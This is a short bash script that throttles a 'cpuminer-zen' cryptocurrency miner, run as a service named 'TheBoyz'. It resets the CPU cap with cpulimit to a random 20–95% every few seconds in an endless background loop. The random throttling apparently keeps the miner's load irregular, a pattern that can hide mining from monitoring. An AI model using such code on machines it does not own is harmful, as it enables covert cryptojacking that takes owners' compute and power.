#!/bin/bash
name="TheBoyz"

function stopshuffle() {
    prcStr=$(ps -aux | grep shuffle)
    PID=(${prcStr//"$(whoami)" / })
    kill $PID
    sudo pkill cpulimit 
}

function limit() {
    threads=$(grep -c ^processor /proc/cpuinfo)
    if [ "$(systemctl is-active TheBoyz.service)" == "active" ]; then
        prcStr=$(ps -aux | grep cpuminer-zen)
        PID=(${prcStr//root / })
        sudo setsid -f cpulimit -p $PID -l $(($threads*$1)) > /dev/null 2>&1
    else
        sudo setsid -f cpulimit -e $name -l $(($threads*$1)) > /dev/null 2>&1
    fi
}

function shuffle() {
    sudo echo
    while true 
    do
        limit $(shuf -i20-95 -n1)
        sleep $(shuf -i5-10 -n1)
        sudo pkill cpulimit;
        wait
    done
}
sudo echo
shuffle&
#stopshuffle